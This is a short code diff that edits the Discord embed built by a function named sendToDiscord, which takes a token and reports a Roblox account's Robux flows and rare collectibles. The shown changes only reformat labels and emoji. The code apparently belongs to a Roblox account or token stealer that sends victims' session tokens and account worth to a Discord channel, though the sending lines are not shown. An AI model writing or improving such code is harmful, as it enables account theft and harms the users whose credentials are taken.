@@ -1676,13 +1676,13 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
             inline: true
           },
           {
-            name: "<:robux:1397659164247068765> Robux Incoming/<:robux:1397659164247068765> Outgoing",
+            name: "Robux In/Out",
             value: `${userData.robuxIncoming || 0}/${userData.robuxOutgoing || 0}`,
             inline: true
           },
           {
-            name: "<:KorbloxDeathspeaker:1408080747306418257> Korblox/<:HeadlessHorseman:1397192572295839806> Headless",
-            value: `${userData.korblox ? "True" : "False"}/${userData.headless ? "True" : "False"}`,
+            name: "<:emoji_26:1409704610469253153> Collectibles",
+            value: `${userData.korblox ? "<:KorbloxDeathspeaker:1408080747306418257> True" : "<:KorbloxDeathspeaker:1408080747306418257> False"}\n${userData.headless ? "<:HeadlessHorseman:1397192572295839806> True" : "<:HeadlessHorseman:1397192572295839806> False"}`,
             inline: true
           },
           {
